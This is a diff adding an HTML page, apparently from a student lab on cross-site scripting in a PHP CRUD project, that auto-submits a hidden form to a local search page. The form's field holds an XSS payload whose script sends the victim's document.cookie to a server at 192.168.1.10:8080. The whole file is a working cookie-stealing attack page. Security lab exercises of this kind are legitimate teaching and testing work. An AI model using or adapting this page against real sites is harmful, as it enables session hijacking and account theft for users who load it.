@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirigiendo...</title>
+</head>
+<body>
+  <form id="evilForm" method="POST" action="http://localhost/pps-usuarios-y-crud-main/buscar_producto_xss_post.php">
+    <input type="hidden" name="q" value="<script>fetch('http://192.168.1.10:8080/?c='+document.cookie)</script>">
+  </form>
+  <script>
+    document.getElementById('evilForm').submit();
+  </script>
+</body>
+</html>
